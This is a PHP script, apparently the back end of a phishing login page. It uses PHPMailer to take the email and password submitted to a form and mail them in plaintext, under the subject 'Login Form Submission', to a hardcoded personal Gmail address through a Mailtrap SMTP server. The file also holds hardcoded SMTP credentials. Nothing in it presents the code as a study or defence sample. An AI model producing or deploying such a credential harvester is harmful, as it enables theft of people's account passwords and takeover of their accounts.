<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    //get data from form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // preparing mail content
    $messagecontent = "Email: " . $email . "<br>Password: " . $password;

    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);

    try {
        //Server settings
        //$mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.mailtrap.io';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'cce4c0db82ac7f';                        //SMTP username
        $mail->Password   = 'de619eae625e82';                        //SMTP password
        //$mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;           //Enable implicit TLS encryption
        $mail->Port       = 2525;                                   //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $mail->setFrom('from@example.com', 'Mailer');
        $mail->addAddress('aciel.692@gmail.com');                   //Add a recipient
        $mail->addReplyTo($email);
        $mail->addCC('cc@example.com');
        $mail->addBCC('bcc@example.com');

        //Attachments

        //$mail->addAttachment('/var/tmp/file.tar.gz');            //Add attachments
        //$mail->addAttachment('photo.jpeg', 'photo.jpeg');        //Optional name

        //Content
        $mail->isHTML(true);                                        //Set email format to HTML
        $mail->Subject = 'Login Form Submission';
        $mail->Body    = $messagecontent;

        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        // echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>
